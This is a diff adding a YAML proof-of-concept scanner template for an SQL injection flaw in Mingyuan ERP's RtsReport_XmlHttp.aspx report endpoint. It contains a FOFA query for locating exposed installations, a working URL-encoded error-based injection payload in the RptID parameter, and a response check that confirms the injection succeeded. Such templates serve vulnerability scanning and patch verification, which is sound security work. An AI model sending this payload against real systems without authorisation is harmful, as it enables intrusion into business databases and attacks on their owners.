@@ -1,0 +1,15 @@
+id: poc-yaml-mingyuanyun-erp-rtsreport-xmlhttp-aspx-sqli
+info:
+  name: 明源地产ERP RtsReport_XmlHttp.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 明源云ERP
+  fofa: app="明源云-ERP"
+requests:
+- method: GET
+  path: /Report/RtsReport_XmlHttp.aspx/?ywtype=SaveGeneralParam&RptID=1%27%2B(SELECT%20CHAR(65)%2BCHAR(119)%2BCHAR(102)%2BCHAR(103)%20WHERE%204294%3D4294%20AND%203472%20IN%20(SELECT%20(CHAR(113)%2BCHAR(107)%2BCHAR(106)%2BCHAR(113)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(3472%3D3472)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2BCHAR(113)%2BCHAR(107)%2BCHAR(98)%2BCHAR(118)%2BCHAR(113))))%2B%27
+  expression: status_code == 302 && contains(headers,"ErrPage.aspx") && contains(headers,"qkjqq1qkbvq")
+    && contains(headers,"varchar") && contains(headers,"int")
+variables: {}
+transport: http
